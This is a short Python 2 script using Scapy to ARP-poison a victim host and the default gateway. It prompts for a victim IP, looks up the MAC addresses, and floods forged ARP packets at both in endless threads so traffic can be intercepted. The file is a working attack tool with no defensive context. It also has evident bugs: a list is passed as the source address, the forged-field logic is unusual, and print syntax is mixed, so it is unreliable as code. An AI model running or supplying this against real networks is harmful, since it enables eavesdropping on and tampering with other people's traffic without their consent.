from scapy.all import *
from netifaces import *
import subprocess, shlex, re, threading
from time import *
 
def run_vPoisoning():
	while True:
		send(vPoisoning, verbose = False)
		print "Send Victim Poisoning Packet!! \n"
		sleep(1)

def run_gPoisoning():
	while True:
		send(gPoisoning, verbose = False)
		print("Send Gateway Poisoning Packet!! \n")
		sleep(1)


str_ifconfig = subprocess.check_output(shlex.split('ifconfig'))
re_ifconfigIP = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
re_ifconfigMAC = r'(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})'
 
ifconfigIP = re.findall('inet addr:'+re_ifconfigIP, str_ifconfig)
ifconfigMAC = re.findall('HWaddr '+re_ifconfigMAC, str_ifconfig)
 
print "My IP : "+ifconfigIP[1]
print "My MAC : "+ifconfigMAC[1]
 
print "Victim IP"
victimIP = raw_input()
Vresult = sr1(ARP(op = ARP.who_has, psrc = ifconfigIP, pdst = victimIP))

victimMAC = Vresult.hwsrc
victimIP = Vresult.psrc
print "Victim IP : "+victimIP
print "Victim MAC : "+victimMAC

gateways = gateways()
gatewayIP = gateways['default'].values()[0][0]

Gresult = sr1(ARP(op = ARP.who_has, psrc = ifconfigIP, pdst = gatewayIP))
gatewayMAC = Gresult.hwsrc

print "Gateway IP : "+gatewayIP
print "Gateway MAC : "+gatewayMAC

vPoisoning = ARP()
vPoisoning.psrc = ifconfigIP[1]
vPoisoning.pdst = victimIP
vPoisoning.hwsrc = gatewayMAC
vPoisoning.hwdst = victimMAC

threading.Thread(target=run_vPoisoning).start()

gPoisoning = ARP()
gPoisoning.psrc = ifconfigIP[1]
gPoisoning.pdst = gatewayIP
gPoisoning.hwsrc = victimMAC
gPoisoning.hwdst = gatewayMAC

threading.Thread(target=run_gPoisoning).start()




